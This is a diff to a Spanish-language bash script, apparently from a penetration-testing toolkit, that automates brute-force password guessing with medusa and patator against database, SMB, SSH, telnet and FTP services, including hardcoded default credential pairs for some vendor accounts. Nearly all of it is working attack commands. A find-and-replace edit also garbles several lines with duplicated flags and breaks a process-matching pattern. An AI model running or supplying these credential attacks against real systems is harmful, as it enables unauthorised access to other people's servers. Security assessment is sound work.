@@ -159,16 +159,16 @@ then
 		port=`echo $line | cut -f2 -d":"`
 		
 		echo -e "[+] Probando $ip:$port"
-		echo "medusa -e n -u sa -P passwords.txt -h $ip -M mssql -f -t 1 "  >> logs/cracking/"$ip"_1433_passwordBD.txt
-		medusa -e n -u sa -P passwords.txt -h $ip -M mssql -f -t 1  >> logs/cracking/"$ip"_1433_passwordBD.txt 2>/dev/null &
+		echo "medusa -t 1 -f -e n -u sa -P passwords.txt -h $ip -M mssql -f -t 1 "  >> logs/cracking/"$ip"_1433_passwordBD.txt
+		medusa -t 1 -f -e n -u sa -P passwords.txt -h $ip -M mssql -f -t 1  >> logs/cracking/"$ip"_1433_passwordBD.txt 2>/dev/null &
 		
 		if [[ "$MODE" == "vulnerabilidades"  || "$MODE" == "completo" ]] ; then
-			echo -e "\n medusa -e n -u adm -P passwords.txt -h $ip -M mssql -f -t 1 "  >>  logs/cracking/"$ip"_1433_passwordBD.txt
-			medusa -e n -u adm -P passwords.txt -h $ip -M mssql -f -t 1 >>  logs/cracking/"$ip"_1433_passwordBD.txt 2>/dev/null &			
+			echo -e "\n medusa -t 1 -f -e n -u adm -P passwords.txt -h $ip -M mssql -f -t 1 "  >>  logs/cracking/"$ip"_1433_passwordBD.txt
+			medusa -t 1 -f -e n -u adm -P passwords.txt -h $ip -M mssql -f -t 1 >>  logs/cracking/"$ip"_1433_passwordBD.txt 2>/dev/null &			
 
 			if [[ -z "$ENTIDAD" && "$ENTIDAD" != NULL ]];then
-				echo -e "\n medusa -e n -u $ENTIDAD -P passwords.txt -h $ip -M mssql -f -t 1 "  >>  logs/cracking/"$ip"_mongo_passwordBD.txt
-				medusa -e n -u $ENTIDAD -P passwords.txt -h $ip -M mssql -f -t 1 >>  logs/cracking/"$ip"_mongo_passwordBD.txt &
+				echo -e "\n medusa -t 1 -f -e n -u $ENTIDAD -P passwords.txt -h $ip -M mssql -f -t 1 "  >>  logs/cracking/"$ip"_mongo_passwordBD.txt
+				medusa -t 1 -f -e n -u $ENTIDAD -P passwords.txt -h $ip -M mssql -f -t 1 >>  logs/cracking/"$ip"_mongo_passwordBD.txt &
 			fi
 			
 		fi		
@@ -187,15 +187,15 @@ then
 		port=`echo $line | cut -f2 -d":"`			
 		
 		echo -e "[+] Probando $ip"
-		echo "medusa -e n -u postgres -P passwords.txt -h $ip -M postgres -f -t 1 "  >>  logs/cracking/"$ip"_5432_passwordBD.txt
-		medusa -e n -u postgres -P passwords.txt -h $ip -M postgres -f -t 1 >>  logs/cracking/"$ip"_5432_passwordBD.txt 2>/dev/null &
+		echo "medusa -t 1 -f -e n -u postgres -P passwords.txt -h $ip -M postgres -f -t 1 "  >>  logs/cracking/"$ip"_5432_passwordBD.txt
+		medusa -t 1 -f -e n -u postgres -P passwords.txt -h $ip -M postgres -f -t 1 >>  logs/cracking/"$ip"_5432_passwordBD.txt 2>/dev/null &
 		
-		echo -e "\n medusa -e n -u pgsql -P passwords.txt -h $ip -M postgres -f -t 1 "  >>  logs/cracking/"$ip"_5432_passwordBD.txt
-		medusa -e n -u pgsql -P passwords.txt -h $ip -M postgres -f -t 1 >>  logs/cracking/"$ip"_5432_passwordBD.txt 2>/dev/null &
+		echo -e "\n medusa -t 1 -f -e n -u pgsql -P passwords.txt -h $ip -M postgres -f -t 1 "  >>  logs/cracking/"$ip"_5432_passwordBD.txt
+		medusa -t 1 -f -e n -u pgsql -P passwords.txt -h $ip -M postgres -f -t 1 >>  logs/cracking/"$ip"_5432_passwordBD.txt 2>/dev/null &
 		
 		if [ -z "$ENTIDAD" ]; then
-			echo -e "\nmedusa -e n -u $ENTIDAD -P passwords.txt -h $ip -M postgres -f -t 1 "  >>  logs/cracking/"$ip"_5432_passwordBD.txt
-			medusa -e n -u $ENTIDAD -P passwords.txt -h $ip -M postgres -f -t 1 >>  logs/cracking/"$ip"_5432_passwordBD.txt &
+			echo -e "\nmedusa -t 1 -f -e n -u $ENTIDAD -P passwords.txt -h $ip -M postgres -f -t 1 "  >>  logs/cracking/"$ip"_5432_passwordBD.txt
+			medusa -t 1 -f -e n -u $ENTIDAD -P passwords.txt -h $ip -M postgres -f -t 1 >>  logs/cracking/"$ip"_5432_passwordBD.txt &
 		fi		
 		
 	 done	
@@ -219,25 +219,25 @@ then
 							
 		else
 			#user root
-			echo -e "\n medusa -e n -u root -P passwords.txt -h $ip -M mysql -f -t 1 "  >>  logs/cracking/"$ip"_3306_passwordBD.txt 
-			medusa -e n -u root -P passwords.txt -h $ip -M mysql -f -t 1 >>  logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null &
+			echo -e "\n medusa -t 1 -f -e n -u root -P passwords.txt -h $ip -M mysql -f -t 1 "  >>  logs/cracking/"$ip"_3306_passwordBD.txt 
+			medusa -t 1 -f -e n -u root -P passwords.txt -h $ip -M mysql -f -t 1 >>  logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null &
 			
 			#user mysql
-			echo -e "\n medusa -e n -u mysql -P passwords.txt -h $ip -M mysql -f -t 1 "  >> logs/cracking/"$ip"_3306_passwordBD.txt
-			medusa -e n -u mysql -P passwords.txt -h $ip -M mysql -f -t 1 >> logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null &
+			echo -e "\n medusa -t 1 -f -e n -u mysql -P passwords.txt -h $ip -M mysql -f -t 1 "  >> logs/cracking/"$ip"_3306_passwordBD.txt
+			medusa -t 1 -f -e n -u mysql -P passwords.txt -h $ip -M mysql -f -t 1 >> logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null &
 			
 			if [[ "$MODE" == "vulnerabilidades"  || "$MODE" == "completo" ]] ; then
 				# user mysql
-				echo -e "\n medusa -e n -u admin -P passwords.txt -h $ip -M mysql -f -t 1 " >>  logs/cracking/"$ip"_3306_passwordBD.txt
-				medusa -e n -u admin -P passwords.txt -h $ip -M mysql -f -t 1 >>  logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null &
+				echo -e "\n medusa -t 1 -f -e n -u admin -P passwords.txt -h $ip -M mysql -f -t 1 " >>  logs/cracking/"$ip"_3306_passwordBD.txt
+				medusa -t 1 -f -e n -u admin -P passwords.txt -h $ip -M mysql -f -t 1 >>  logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null &
 				
 				#administrador/administrator
-				echo -e "\n medusa -e n -u $admin_user -P passwords.txt -h $ip -M mysql -f -t 1 " >>  logs/cracking/"$ip"_3306_passwordBD.txt				
-				medusa -e n -u $admin_user -P passwords.txt -h $ip -M mysql -f -t 1  >>  logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null &		
+				echo -e "\n medusa -t 1 -f -e n -u $admin_user -P passwords.txt -h $ip -M mysql -f -t 1 " >>  logs/cracking/"$ip"_3306_passwordBD.txt				
+				medusa -t 1 -f -e n -u $admin_user -P passwords.txt -h $ip -M mysql -f -t 1  >>  logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null &		
 				
 				if [[ -z "$ENTIDAD" && "$ENTIDAD" != NULL ]];then
-					echo -e "\n medusa -e n -u $ENTIDAD  -P passwords.txt -h $ip -M mysql -f -t 1 " >>  logs/cracking/"$ip"_3306_passwordBD.txt				
-					medusa -e n -u $ENTIDAD  -P passwords.txt -h $ip -M mysql -f -t 1  >>  logs/cracking/"$ip"_3306_passwordBD.txt	&
+					echo -e "\n medusa -t 1 -f -e n -u $ENTIDAD  -P passwords.txt -h $ip -M mysql -f -t 1 " >>  logs/cracking/"$ip"_3306_passwordBD.txt				
+					medusa -t 1 -f -e n -u $ENTIDAD  -P passwords.txt -h $ip -M mysql -f -t 1  >>  logs/cracking/"$ip"_3306_passwordBD.txt	&
 				fi
 				
 			fi			
@@ -247,12 +247,18 @@ then
 fi
 
 
-	### Windows
-	if [ -f servicios/Windows.txt ]
-	then		
-		echo -e "$OKBLUE\n\t#################### Testing windows auth ######################$RESET"			
-		for line in $(cat servicios/Windows.txt); do
-			ip=`echo $line | cut -f1 -d":"`			
+### Windows
+if [ -f servicios/Windows.txt ]
+then		
+	echo -e "$OKBLUE\n\t#################### Testing windows auth ######################$RESET"			
+	for line in $(cat servicios/Windows.txt); do
+		ip=`echo $line | cut -f1 -d":"`			
+		grep -iq 'allows sessions using username' .vulnerabilidades2/"$ip"_445_nullsession.txt		
+		greprc=$?
+		if [[ $greprc -eq 0 ]] ; then	
+			echo -e "[+] Null session detectada en $ip"
+		else
+
 			echo -e "[+] Probando $ip"
 
 			echo "patator smb_login host=$ip user=$admin_user password=FILE0 0=passwords.txt " > logs/cracking/"$ip"_"$admin_user"-smb_passwordAdivinadoWin.txt
@@ -273,9 +279,43 @@ fi
 				echo "patator smb_login host=$ip user=$ENTIDAD password=FILE0 0=passwords.txt " > logs/cracking/"$ip"_"$ENTIDAD"-smb_passwordAdivinadoWin.txt
 				patator smb_login host=$ip user=$ENTIDAD password=FILE0 0=passwords.txt  2> logs/cracking/"$ip"_"$ENTIDAD"-smb_passwordAdivinadoWin.txt 
 			fi	
-		done	
-	fi
+		fi # no null session
+	done	
+fi
 
+### SSH #########
+if [ -f servicios/ssh.txt ]
+then	
+	echo -e "$OKBLUE\n\t#################### Testing pass SSH ######################$RESET"	
+	for line in $(cat servicios/ssh.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+
+		if [[ -z "$ENTIDAD" && "$ENTIDAD" != NULL ]];then
+			echo "Usuario $entidad" 
+			medusa -t 1 -f -u $entidad -P passwords.txt -h $ip -M ssh -s >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &			
+		fi				
+
+		if [ -f .enumeracion2/"$ip"_445_localUsers.txt ]; then	
+			echo "Usuarios identificados mediante enum4linux" 
+			for username in $(cat .enumeracion2/"$ip"_445_localUsers.txt); do
+				echo "Probando usuario: $username"
+				medusa -t 1 -f -u $username -P passwords.txt -h $ip -M ssh -s >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
+			done
+		fi
+
+		if [ -f .vulnerabilidades2/"$ip"_"$port"_enumeracionUsuariosSSH.txt ]; then	
+			echo "Usuarios identificados mediante CVE" 				
+			for username in $(cat .vulnerabilidades2/"$ip"_"$port"_enumeracionUsuariosSSH.txt); do
+				echo "Probando usuario: $username"
+				medusa -t 1 -f -u $username -P passwords.txt -h $ip -M ssh -s >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
+			done									
+		fi		
+		
+		echo "Probando usuario: root"								
+		medusa -t 1 -f -u root -P passwords.txt -h $ip -M ssh -s >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
+	done	
+fi
 
 
 old_ifs="$IFS"
@@ -504,8 +544,8 @@ fi
 		#ip=`echo $line | cut -f1 -d":"`
 		#port=`echo $line | cut -f2 -d":"`
 		#echo -e "[+] Probando $ip"
-#		medusa -e n -u root -P passwords.txt -h $ip -M vmauthd | tee -a  logs/cracking/"$ip"_vmware.txt	
-		#medusa -e n -u $entidad  -P passwords.txt -h $ip -M vmauthd | tee -a  logs/cracking/"$ip"_vmware.txt
+#		medusa -t 1 -f -e n -u root -P passwords.txt -h $ip -M vmauthd | tee -a  logs/cracking/"$ip"_vmware.txt	
+		#medusa -t 1 -f -e n -u $entidad  -P passwords.txt -h $ip -M vmauthd | tee -a  logs/cracking/"$ip"_vmware.txt
 		#grep --color=never SUCCESS logs/cracking/"$ip"_vmware.txt > .vulnerabilidades/"$ip"_vmware_passwordAdivinadoServ.txt
 #		echo ""			
 	 #done
@@ -585,31 +625,7 @@ fi
 
 
 if [[ "$MODE" == "vulnerabilidades"  || "$MODE" == "completo" ]] ; then	
-	
-	### SSH #########
-
-	if [ -f servicios/ssh.txt ]
-	then	
-		echo -e "$OKBLUE\n\t#################### Testing pass SSH ######################$RESET"	
-		for line in $(cat servicios/ssh.txt); do
-			ip=`echo $line | cut -f1 -d":"`
-			port=`echo $line | cut -f2 -d":"`
-
-			if [ -f .vulnerabilidades2/"$ip"_"$port"_enumeracionUsuariosSSH.txt ]; then	
-				echo "Usuarios identificados mediante CVE" 
-				cat .vulnerabilidades2/"$ip"_"$port"_enumeracionUsuariosSSH.txt
-				for username in $(cat .vulnerabilidades2/"$ip"_"$port"_enumeracionUsuariosSSH.txt); do
-					echo "Probando usuario: $username"
-					medusa -u $username -P passwords.txt -h $ip -M ssh >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
-				done			
-			else
-				echo "Probando usuario: root"				
-				medusa -u $entidad -P passwords.txt -h $ip -M ssh >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &			
-				medusa -u root -P passwords.txt -h $ip -M ssh >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
-			fi		
-		done	
-	fi
-
+		
 	### telnet #########
 	if [ -f servicios/telnet.txt ]
 	then
@@ -617,8 +633,8 @@ if [[ "$MODE" == "vulnerabilidades"  || "$MODE" == "completo" ]] ; then
 		for line in $(cat servicios/telnet.txt); do
 			ip=`echo $line | cut -f1 -d":"`
 			port=`echo $line | cut -f2 -d":"`
-			medusa -e n -u $entidad -P passwords.txt -h $ip -M telnet >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
-			medusa -e n -u root -P passwords.txt -h $ip -M telnet >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
+			medusa -t 1 -f -e n -u $entidad -P passwords.txt -h $ip -M telnet >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
+			medusa -t 1 -f -e n -u root -P passwords.txt -h $ip -M telnet >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
 		done	
 	fi
 
@@ -791,14 +807,14 @@ if [[ "$MODE" == "vulnerabilidades"  || "$MODE" == "completo" ]] ; then
 		if [[ $noImpresora_port21 -eq 1 && $noImpresora_port80 -eq 1 && $noImpresora_port23 -eq 1 ]] ; then			
 			echo -e "[+] Probando $ip"		
 			
-			#echo -e "\n medusa -e n -u admin -P passwords.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
-			#medusa -e n -u admin -P passwords.txt -h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
+			#echo -e "\n medusa -t 1 -f -e n -u admin -P passwords.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
+			#medusa -t 1 -f -e n -u admin -P passwords.txt -h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
 			
-			#echo -e "\n medusa  -u root -P passwords.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
-			#medusa  -u root -P passwords.txt -h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
+			#echo -e "\n medusa -t 1 -f -u root -P passwords.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
+			#medusa -t 1 -f -u root -P passwords.txt -h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
 			
-			echo -e "\n medusa  -u ftp -P passwords.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt					
-			medusa -u ftp -P passwords.txt -h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt					
+			echo -e "\n medusa -t 1 -f -u ftp -P passwords.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt					
+			medusa -t 1 -f -u ftp -P passwords.txt -h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt					
 			
 			respuesta=`grep --color=never SUCCESS logs/cracking/"$ip"_21_passwordAdivinadoServ.txt`
 			greprc=$?
@@ -829,20 +845,20 @@ if [[ "$MODE" == "vulnerabilidades"  || "$MODE" == "completo" ]] ; then
 			echo -e "\n\t########### $ip #######"			
 			echo -e "\t [+] Probando password por defecto (SFI)"
 			
-			echo -e "\n medusa -u tbsai -p Tbsai -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
-			medusa -u tbsai -p Tbsai -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
+			echo -e "\n medusa -t 1 -f -u tbsai -p Tbsai -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
+			medusa -t 1 -f -u tbsai -p Tbsai -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
 			
-			echo -e "\n medusa -u tbsai -p tbsai -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
-			medusa -u tbsai -p tbsai -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
+			echo -e "\n medusa -t 1 -f -u tbsai -p tbsai -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
+			medusa -t 1 -f -u tbsai -p tbsai -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
 			
-			echo -e "\n medusa -u sfibak -p sfibak -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
-			medusa -u sfibak -p sfibak -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
+			echo -e "\n medusa -t 1 -f -u sfibak -p sfibak -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
+			medusa -t 1 -f -u sfibak -p sfibak -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
 			
-			echo -e "\n medusa -u sfi -p sfi -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
-			medusa -u sfi -p sfi -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
+			echo -e "\n medusa -t 1 -f -u sfi -p sfi -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
+			medusa -t 1 -f -u sfi -p sfi -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
 			
-			echo -e "\n medusa -u informix -p informix -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null		
-			medusa -u informix -p informix -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null		
+			echo -e "\n medusa -t 1 -f -u informix -p informix -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null		
+			medusa -t 1 -f -u informix -p informix -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null		
 			
 			grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_22_passwordSFI.txt > .vulnerabilidades/"$ip"_22_passwordSFI.txt 					
 		done
@@ -858,10 +874,10 @@ fi #modo completo/vulnerabilidades
 
 ######## wait to finish########
 while true; do
-	scan_instancias=$((`ps aux | egrep 'medusa|passWeb|patator|crackmapexec' | egrep -v 'color|keyring|vscode-server|responder' | wc -l` - 1)) 
+	scan_instancias=$((`ps aux | egrep 'medusa -t 1 -f |passWeb|patator|crackmapexec' | egrep -v 'color|keyring|vscode-server|responder' | wc -l` - 1)) 
 	if [ "$scan_instancias" -gt 0 ]
 	then
-		echo -e "\t[i] Todavia hay escaneos de medusa/passWeb activos ($scan_instancias)"  
+		echo -e "\t[i] Todavia hay escaneos de medusa -t 1 -f /passWeb activos ($scan_instancias)"  
 		sleep 30
 	else
 		break		  		 
@@ -961,25 +977,30 @@ then
 	echo -e "$OKBLUE #################### PARSE (`wc -l servicios/Windows.txt`) ######################$RESET"	    		
 	for ip in $(cat servicios/Windows.txt); do	
 		echo -e "[+] Parse $ip"					
-				
-		password_smb=`grep -i windows logs/cracking/"$ip"_"$admin_user"-smb_passwordAdivinadoWin.txt 2>/dev/null| awk {'print $9'}`
-		if [[ -n "$password_smb" ]];then
-			echo "Usuario:$admin_user Password:$password_smb" >	.vulnerabilidades/"$ip"_smb_passwordAdivinadoWin.txt
-		fi
+		grep -iq 'allows sessions using username' .vulnerabilidades2/"$ip"_445_nullsession.txt		
+		greprc=$?
+		if [[ $greprc -eq 0 ]] ; then	
+			echo -e "[+] Null session detectada en $ip"
+		else
+			password_smb=`grep -i windows logs/cracking/"$ip"_"$admin_user"-smb_passwordAdivinadoWin.txt 2>/dev/null| awk {'print $9'}`
+			if [[ -n "$password_smb" ]];then
+				echo "Usuario:$admin_user Password:$password_smb" >	.vulnerabilidades/"$ip"_smb_passwordAdivinadoWin.txt
+			fi
 
-		password_smb=`grep -i windows logs/cracking/"$ip"_soporte-windows_passwordAdivinadoWin.txt 2>/dev/null| awk {'print $9'}`
-		if [[ -n "$password_smb" ]];then
-			echo "Usuario:soporte Password:$password_smb" >> .vulnerabilidades/"$ip"_smb_passwordAdivinadoWin.txt
-		fi
+			password_smb=`grep -i windows logs/cracking/"$ip"_soporte-windows_passwordAdivinadoWin.txt 2>/dev/null| awk {'print $9'}`
+			if [[ -n "$password_smb" ]];then
+				echo "Usuario:soporte Password:$password_smb" >> .vulnerabilidades/"$ip"_smb_passwordAdivinadoWin.txt
+			fi
 
-		password_smb=`grep -i windows logs/cracking/"$ip"_"$ENTIDAD"-smb_passwordAdivinadoWin.txt 2>/dev/null| awk {'print $9'}`
-		if [[ -n "$password_smb" ]];then
-			echo "Usuario:$ENTIDAD Password:$password_smb" >> .vulnerabilidades/"$ip"_smb_passwordAdivinadoWin.txt
-		fi
+			password_smb=`grep -i windows logs/cracking/"$ip"_"$ENTIDAD"-smb_passwordAdivinadoWin.txt 2>/dev/null| awk {'print $9'}`
+			if [[ -n "$password_smb" ]];then
+				echo "Usuario:$ENTIDAD Password:$password_smb" >> .vulnerabilidades/"$ip"_smb_passwordAdivinadoWin.txt
+			fi
 
-		password_smb=`grep -i windows logs/cracking/"$ip"_sistemas-windows_passwordAdivinadoWin.txt 2>/dev/null| awk {'print $9'} `
-		if [[ -n "$password_smb" ]];then
-			echo "Usuario:sistemas Password:$password_smb" >> .vulnerabilidades/"$ip"_smb_passwordAdivinadoWin.txt
+			password_smb=`grep -i windows logs/cracking/"$ip"_sistemas-windows_passwordAdivinadoWin.txt 2>/dev/null| awk {'print $9'} `
+			if [[ -n "$password_smb" ]];then
+				echo "Usuario:sistemas Password:$password_smb" >> .vulnerabilidades/"$ip"_smb_passwordAdivinadoWin.txt
+			fi
 		fi
 		#https://github.com/m4ll0k/SMBrute (shared)											
 	 done	
